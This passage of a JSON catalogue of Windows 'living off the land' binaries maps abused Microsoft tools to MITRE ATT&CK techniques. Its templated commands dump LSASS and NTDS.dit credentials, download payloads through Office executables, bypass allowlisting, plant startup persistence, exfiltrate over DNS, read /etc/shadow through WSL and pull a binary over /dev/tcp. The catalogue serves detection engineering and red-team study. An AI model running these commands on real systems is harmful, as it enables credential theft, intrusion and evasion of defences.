                    "code": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Dump64.exe",
            "description": "Memory dump tool that comes with Microsoft Visual Studio",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Creates a memory dump of the LSASS process.",
                    "code": "dump64.exe {PID} out.dmp"
                }
            ],
            "mitre": {
                "technique": "T1003.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "DumpMinitool.exe",
            "description": "Dump tool part Visual Studio 2022",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Creates a memory dump of the lsass process",
                    "code": "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full"
                }
            ],
            "mitre": {
                "technique": "T1003.001",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.001/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Dxcap.exe",
            "description": "DirectX diagnostics/debugger included with Visual Studio.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument.",
                    "code": "Dxcap.exe -c {PATH_ABSOLUTE:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "ECMangen.exe",
            "description": "Command-line tool for managing certificates in Microsoft Exchange Server.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "ECMangen.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Excel.exe",
            "description": "Microsoft Office binary",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "Excel.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Fsi.exe",
            "description": "64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Execute F# code via script file",
                    "code": "fsi.exe {PATH:.fsscript}"
                },
                {
                    "label": "Execute F# code via interactive command line",
                    "code": "fsi.exe"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "FsiAnyCpu.exe",
            "description": "32/64-bit FSharp (F#) Interpreter included with Visual Studio.",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Execute F# code via script file",
                    "code": "fsianycpu.exe {PATH:.fsscript}"
                },
                {
                    "label": "Execute F# code via interactive command line",
                    "code": "fsianycpu.exe"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "IntelliTrace.exe",
            "description": "Visual Studio command-line tool for collecting and managing diagnostic trace files.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launches an executable via Visual Studio command line utility.",
                    "code": "IntelliTrace.exe launch /cp:\"collectionplan.xml\" /f:\"c:\\users\\public\\log\" \"C:\\Windows\\System32\\calc.exe\""
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mftrace.exe",
            "description": "Trace log generation tool for Media Foundation Tools.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch specified executable as a subprocess of Mftrace.exe.",
                    "code": "Mftrace.exe {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Microsoft.NodejsTools.PressAnyKey.exe",
            "description": "Part of the NodeJS Visual Studio tools.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe.",
                    "code": "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mpiexec.exe",
            "description": "Command-line tool for running Message Passing Interface (MPI) applications.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes a command via MPI command-line tool.",
                    "code": "mpiexec.exe {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "MSAccess.exe",
            "description": "Microsoft Office component",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "MSAccess.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Msdeploy.exe",
            "description": "Microsoft tool used to deploy Web Applications.",
            "categories": [
                "execute",
                "awl-bypass",
                "copy"
            ],
            "commands": [
                {
                    "label": "Launch .bat file via msdeploy.exe.",
                    "code": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\""
                },
                {
                    "label": "Launch .bat file via msdeploy.exe.",
                    "code": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\""
                },
                {
                    "label": "Copy file from source to destination.",
                    "code": "msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "MsoHtmEd.exe",
            "description": "Microsoft Office component",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "MsoHtmEd.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Mspub.exe",
            "description": "Microsoft Publisher",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "mspub.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "msxsl.exe",
            "description": "Command line utility used to perform XSL transformations.",
            "categories": [
                "execute",
                "awl-bypass",
                "download"
            ],
            "commands": [
                {
                    "label": "Run COM Scriptlet code within the script.xsl file (local).",
                    "code": "msxsl.exe {PATH:.xml} {PATH:.xsl}"
                },
                {
                    "label": "Run COM Scriptlet code within the script.xsl file (local).",
                    "code": "msxsl.exe {PATH:.xml} {PATH:.xsl}"
                },
                {
                    "label": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).",
                    "code": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}"
                },
                {
                    "label": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).",
                    "code": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}"
                },
                {
                    "label": "Using remote XML and XSL files, save the transformed XML file to disk.",
                    "code": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}"
                },
                {
                    "label": "Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).",
                    "code": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name"
                }
            ],
            "mitre": {
                "technique": "T1220",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1220/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "ntdsutil.exe",
            "description": "Command line utility used to export Active Directory.",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Dump NTDS.dit into folder",
                    "code": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q"
                }
            ],
            "mitre": {
                "technique": "T1003.003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ntsd.exe",
            "description": "Symbolic Debugger for Windows.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launches command through the debugging process; optionally add `-G` to exit the debugger automatically.",
                    "code": "ntsd.exe -g {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "OpenConsole.exe",
            "description": "Console Window host for Windows Terminal",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute specified process with OpenConsole.exe as parent process",
                    "code": "OpenConsole.exe {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Pixtool.exe",
            "description": "Command line utility for taking and analyzing PIX GPU captures.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launches an executable via PIX command-line utility.",
                    "code": "pixtool.exe launch {PATH_ABSOLUTE:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Powerpnt.exe",
            "description": "Microsoft Office binary.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "Powerpnt.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Procdump.exe",
            "description": "SysInternals Memory Dump Tool",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.",
                    "code": "procdump.exe -md {PATH:.dll} explorer.exe"
                },
                {
                    "label": "Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.",
                    "code": "procdump.exe -md {PATH:.dll} foobar"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "ProtocolHandler.exe",
            "description": "Microsoft Office binary",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "ProtocolHandler.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "rcsi.exe",
            "description": "Non-Interactive command line inerface included with Visual Studio.",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Use embedded C# within the csx script to execute the code.",
                    "code": "rcsi.exe {PATH:.csx}"
                },
                {
                    "label": "Use embedded C# within the csx script to execute the code.",
                    "code": "rcsi.exe {PATH:.csx}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Remote.exe",
            "description": "Debugging tool included with Windows Debugging Tools",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Spawns specified executable as a child process of remote.exe",
                    "code": "Remote.exe /s {PATH:.exe} anythinghere"
                },
                {
                    "label": "Spawns specified executable as a child process of remote.exe",
                    "code": "Remote.exe /s {PATH:.exe} anythinghere"
                },
                {
                    "label": "Run a remote file",
                    "code": "Remote.exe /s {PATH_SMB:.exe} anythinghere"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Sqldumper.exe",
            "description": "Debugging utility included with Microsoft SQL.",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).",
                    "code": "sqldumper.exe 464 0 0x0110"
                },
                {
                    "label": "0x01100:40 flag will create a Mimikatz compatible dump file.",
                    "code": "sqldumper.exe 540 0 0x01100:40"
                }
            ],
            "mitre": {
                "technique": "T1003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Sqlps.exe",
            "description": "Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.",
                    "code": "Sqlps.exe -noprofile"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "SQLToolsPS.exe",
            "description": "Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.",
                    "code": "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Squirrel.exe",
            "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
            "categories": [
                "download",
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "The above binary will go to url and look for RELEASES file and download the nuget package.",
                    "code": "squirrel.exe --download {REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "squirrel.exe --update {REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "squirrel.exe --update {REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "squirrel.exe --updateRollback={REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "squirrel.exe --updateRollback={REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "te.exe",
            "description": "Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.",
                    "code": "te.exe {PATH:.wsc}"
                },
                {
                    "label": "Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures.",
                    "code": "te.exe {PATH:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Teams.exe",
            "description": "Electron runtime binary which runs the Teams application",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Generate JavaScript payload and package.json, and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app\\\\\" before executing.",
                    "code": "teams.exe"
                },
                {
                    "label": "Generate JavaScript payload and package.json, archive in ASAR file and save to \"%LOCALAPPDATA%\\\\Microsoft\\\\Teams\\\\current\\\\app.asar\" before executing.",
                    "code": "teams.exe"
                },
                {
                    "label": "Teams spawns cmd.exe as a child process of teams.exe and executes the ping command",
                    "code": "teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
                }
            ],
            "mitre": {
                "technique": "T1218.015",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.015/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "TestWindowRemoteAgent.exe",
            "description": "TestWindowRemoteAgent.exe is the command-line tool to establish RPC",
            "categories": [
                "upload"
            ],
            "commands": [
                {
                    "label": "Sends DNS query for open connection to any host, enabling exfiltration over DNS",
                    "code": "TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000"
                }
            ],
            "mitre": {
                "technique": "T1048",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1048/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Tracker.exe",
            "description": "Tool included with Microsoft .Net Framework.",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.",
                    "code": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe"
                },
                {
                    "label": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.",
                    "code": "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Update.exe",
            "description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
            "categories": [
                "download",
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "The above binary will go to url and look for RELEASES file and download the nuget package.",
                    "code": "Update.exe --download {REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "Update.exe --update={REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "Update.exe --update={REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "code": "Update.exe --update={PATH_SMB:folder}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "code": "Update.exe --update={PATH_SMB:folder}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "Update.exe --updateRollback={REMOTEURL}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "code": "Update.exe --updateRollback={REMOTEURL}"
                },
                {
                    "label": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.",
                    "code": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\""
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "code": "Update.exe --updateRollback={PATH_SMB:folder}"
                },
                {
                    "label": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "code": "Update.exe --updateRollback={PATH_SMB:folder}"
                },
                {
                    "label": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.",
                    "code": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\""
                },
                {
                    "label": "Copy your payload into \"%localappdata%\\Microsoft\\Teams\\current\\\". Then run the command. Update.exe will create a shortcut to the specified executable in \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\". Then payload will run on every login of the user who runs it.",
                    "code": "Update.exe --createShortcut={PATH:.exe} -l=Startup"
                },
                {
                    "label": "Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page.",
                    "code": "Update.exe --removeShortcut={PATH:.exe}-l=Startup"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "VSDiagnostics.exe",
            "description": "Command-line tool used for performing diagnostics.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.",
                    "code": "VSDiagnostics.exe start 1 /launch:{PATH:.exe}"
                },
                {
                    "label": "Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.",
                    "code": "VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:\"{CMD:args}\""
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "VSIISExeLauncher.exe",
            "description": "Binary will execute specified binary. Part of VS/VScode installation.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "The above binary will execute other binary.",
                    "code": "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\""
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Visio.exe",
            "description": "Microsoft Visio Executable",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "Visio.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "VisualUiaVerifyNative.exe",
            "description": "A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Generate Serialized gadget and save to - `C:\\Users\\%USERNAME%\\AppData\\Roaminguiverify.config` before executing.",
                    "code": "VisualUiaVerifyNative.exe"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "VSLaunchBrowser.exe",
            "description": "Microsoft Visual Studio browser launcher tool for web applications debugging",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "Download and execute payload from remote server",
                    "code": "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}"
                },
                {
                    "label": "Execute payload via VSLaunchBrowser as parent process",
                    "code": "VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Execute payload from WebDAV server via VSLaunchBrowser as parent process",
                    "code": "VSLaunchBrowser.exe .exe {PATH_SMB}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Vshadow.exe",
            "description": "VShadow is a command-line tool that can be used to create and manage volume shadow copies.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes specified executable from vshadow.exe.",
                    "code": "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "vsjitdebugger.exe",
            "description": "Just-In-Time (JIT) debugger included with Visual Studio",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes specified executable as a subprocess of Vsjitdebugger.exe.",
                    "code": "Vsjitdebugger.exe {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "WFMFormat.exe",
            "description": "Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5.",
                    "code": "WFMFormat.exe"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wfc.exe",
            "description": "The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Execute arbitrary C# code embedded in a XOML file.",
                    "code": "wfc.exe {PATH_ABSOLUTE:.xoml}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "WinDbg.exe",
            "description": "Windows Debugger for advanced user-mode and kernel-mode debugging.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launches a command line through the debugging process; optionally add `-G` to exit the debugger automatically.",
                    "code": "windbg.exe -g {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "WinProj.exe",
            "description": "Microsoft Project Executable",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "WinProj.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Winword.exe",
            "description": "Microsoft Office binary",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Downloads payload from remote server",
                    "code": "winword.exe {REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wsl.exe",
            "description": "Windows subsystem for Linux executable",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Executes calc.exe from wsl.exe",
                    "code": "wsl.exe -e /mnt/c/Windows/System32/calc.exe"
                },
                {
                    "label": "Cats /etc/shadow file as root",
                    "code": "wsl.exe -u root -e cat /etc/shadow"
                },
                {
                    "label": "Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)",
                    "code": "wsl.exe --exec bash -c \"{CMD}\""
                },
                {
                    "label": "Downloads file from 192.168.1.10",
                    "code": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'"
                },
                {
                    "label": "When executed, `wsl.exe` queries the registry value of `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`, which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.",
                    "code": "wsl.exe"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "XBootMgr.exe",
            "description": "Windows Performance Toolkit binary used to start performance traces.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes an executable after the trace is complete using the callBack parameter.",
                    "code": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -callBack {PATH:.exe}"
                },
                {
                    "label": "Executes an executable before each trace run using the preTraceCmd parameter.",
                    "code": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -preTraceCmd {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "XBootMgrSleep.exe",
            "description": "Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution.",
                    "code": "xbootmgrsleep.exe 1000 {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "devtunnel.exe",
            "description": "Binary to enable forwarded ports on windows operating systems.",
            "categories": [
                "download"
            ],
            "commands": [
                {
                    "label": "Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet.",
                    "code": "devtunnel.exe host -p 8080"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "vsls-agent.exe",
            "description": "Agent for Visual Studio Live Share (Code Collaboration)",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Load a library payload using the --agentExtensionPath parameter (32-bit)",
